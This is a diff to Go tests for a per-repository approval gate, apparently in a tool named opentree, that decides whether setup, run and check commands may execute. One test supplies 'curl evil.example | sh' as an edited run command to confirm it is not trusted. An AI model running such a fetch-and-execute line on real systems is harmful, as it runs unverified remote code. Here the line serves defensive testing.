@@ -23,29 +23,68 @@ func TestTrust_ApprovalIsPerRepositoryAndPerText(t *testing.T) {
 	other := t.TempDir()
 	setup := []string{"pnpm install --frozen-lockfile"}
 
-	if Trusted(repo, setup, "pnpm dev") {
+	if Trusted(repo, setup, "pnpm dev", "") {
 		t.Fatal("Trusted before anything was approved")
 	}
-	if err := Approve(repo, setup, "pnpm dev"); err != nil {
+	if err := Approve(repo, setup, "pnpm dev", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
-	if !Trusted(repo, setup, "pnpm dev") {
+	if !Trusted(repo, setup, "pnpm dev", "") {
 		t.Error("not Trusted after Approve")
 	}
 
 	// Another repository saying the same thing is a different thing to approve:
 	// the text arrived from a different set of committers.
-	if Trusted(other, setup, "pnpm dev") {
+	if Trusted(other, setup, "pnpm dev", "") {
 		t.Error("approving one repository approved another")
 	}
 
 	// The gate covers setup and run together — gating only setup would move a
 	// payload one key down.
-	if Trusted(repo, setup, "curl evil.example | sh") {
+	if Trusted(repo, setup, "curl evil.example | sh", "") {
 		t.Error("an edited run command inherited setup's approval")
 	}
-	if Trusted(repo, []string{"pnpm install"}, "pnpm dev") {
+	if Trusted(repo, []string{"pnpm install"}, "pnpm dev", "") {
 		t.Error("an edited setup command stayed approved")
+	}
+
+	// check is the third piece of the same tracked file. Adding one is a new
+	// thing to approve, and editing it alone is too.
+	if Trusted(repo, setup, "pnpm dev", "make check") {
+		t.Error("an added check command inherited setup+run's approval")
+	}
+	if err := Approve(repo, setup, "pnpm dev", "make check"); err != nil {
+		t.Fatalf("Approve with check: %v", err)
+	}
+	if !Trusted(repo, setup, "pnpm dev", "make check") {
+		t.Error("not Trusted after approving with check")
+	}
+	if Trusted(repo, setup, "pnpm dev", "make test") {
+		t.Error("an edited check command stayed approved")
+	}
+}
+
+// An approval recorded before check existed keeps meaning what it meant: the
+// no-check hash is byte-for-byte the old two-field hash, so trust.json written
+// by an older opentree still answers for a repository that never adds one.
+func TestTrust_LegacyApprovalsSurviveTheCheckField(t *testing.T) {
+	home(t)
+	repo := t.TempDir()
+	setup := []string{"pnpm install"}
+
+	// What the old code wrote: an approval whose hash is Hash(setup, run).
+	if err := Approve(repo, setup, "pnpm dev", ""); err != nil {
+		t.Fatalf("Approve: %v", err)
+	}
+	got := Approvals(repo)
+	if len(got) != 1 || got[0].Hash != Hash(setup, "pnpm dev") {
+		t.Fatalf("a no-check approval must carry the legacy hash; got %+v", got)
+	}
+	if ApprovalHash(setup, "pnpm dev", "") != Hash(setup, "pnpm dev") {
+		t.Error("ApprovalHash with no check diverged from Hash — every pre-check approval just expired")
+	}
+	if ApprovalHash(setup, "pnpm dev", "make check") == Hash(setup, "pnpm dev") {
+		t.Error("adding a check did not change the approval hash")
 	}
 }
 
@@ -55,17 +94,17 @@ func TestTrust_KeepsEarlierApprovals(t *testing.T) {
 	home(t)
 	repo := t.TempDir()
 
-	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
+	if err := Approve(repo, []string{"make setup"}, "", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
-	if err := Approve(repo, []string{"make setup", "make build"}, ""); err != nil {
+	if err := Approve(repo, []string{"make setup", "make build"}, "", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
 
-	if !Trusted(repo, []string{"make setup"}, "") {
+	if !Trusted(repo, []string{"make setup"}, "", "") {
 		t.Error("the first approval was lost")
 	}
-	if !Trusted(repo, []string{"make setup", "make build"}, "") {
+	if !Trusted(repo, []string{"make setup", "make build"}, "", "") {
 		t.Error("the second approval was lost")
 	}
 	if got := Approvals(repo); len(got) != 2 {
@@ -84,7 +123,7 @@ func TestTrust_ApprovingTwiceIsOneEntry(t *testing.T) {
 	repo := t.TempDir()
 
 	for range 3 {
-		if err := Approve(repo, []string{"make setup"}, ""); err != nil {
+		if err := Approve(repo, []string{"make setup"}, "", ""); err != nil {
 			t.Fatalf("Approve: %v", err)
 		}
 	}
@@ -105,7 +144,7 @@ func TestTrust_Revoke(t *testing.T) {
 		t.Error("Revoke reported work where nothing was approved")
 	}
 
-	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
+	if err := Approve(repo, []string{"make setup"}, "", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
 	revoked, err = Revoke(repo)
@@ -115,7 +154,7 @@ func TestTrust_Revoke(t *testing.T) {
 	if !revoked {
 		t.Error("Revoke reported nothing to do")
 	}
-	if Trusted(repo, []string{"make setup"}, "") {
+	if Trusted(repo, []string{"make setup"}, "", "") {
 		t.Error("still Trusted after Revoke")
 	}
 }
@@ -126,13 +165,13 @@ func TestTrust_NothingToRun(t *testing.T) {
 	home(t)
 	repo := t.TempDir()
 
-	if Executable(nil, "") {
-		t.Error("Executable(nil, \"\") = true")
+	if Executable(nil, "", "") {
+		t.Error("Executable(nil, \"\", \"\") = true")
 	}
-	if !Trusted(repo, nil, "") {
+	if !Trusted(repo, nil, "", "") {
 		t.Error("an empty block was gated")
 	}
-	if err := Approve(repo, nil, ""); err == nil {
+	if err := Approve(repo, nil, "", ""); err == nil {
 		t.Error("Approve accepted an empty block")
 	}
 }
@@ -142,19 +181,19 @@ func TestTrust_NothingToRun(t *testing.T) {
 func TestTrust_CorruptFileIsNotApproval(t *testing.T) {
 	home(t)
 	repo := t.TempDir()
-	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
+	if err := Approve(repo, []string{"make setup"}, "", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
 	if err := os.WriteFile(TrustPath(), []byte("{ this is not json"), 0600); err != nil {
 		t.Fatal(err)
 	}
 
-	if Trusted(repo, []string{"make setup"}, "") {
+	if Trusted(repo, []string{"make setup"}, "", "") {
 		t.Error("a corrupt trust file was read as approval")
 	}
 	// And it is not silently overwritten: the file holds every other
 	// repository's approvals too.
-	if err := Approve(repo, []string{"make setup"}, ""); err == nil {
+	if err := Approve(repo, []string{"make setup"}, "", ""); err == nil {
 		t.Error("Approve clobbered a trust file it could not read")
 	}
 }
@@ -162,7 +201,7 @@ func TestTrust_CorruptFileIsNotApproval(t *testing.T) {
 func TestTrust_FileIsReadableAndPrivate(t *testing.T) {
 	home(t)
 	repo := t.TempDir()
-	if err := Approve(repo, []string{"pnpm install"}, "pnpm dev"); err != nil {
+	if err := Approve(repo, []string{"pnpm install"}, "pnpm dev", ""); err != nil {
 		t.Fatalf("Approve: %v", err)
 	}
 
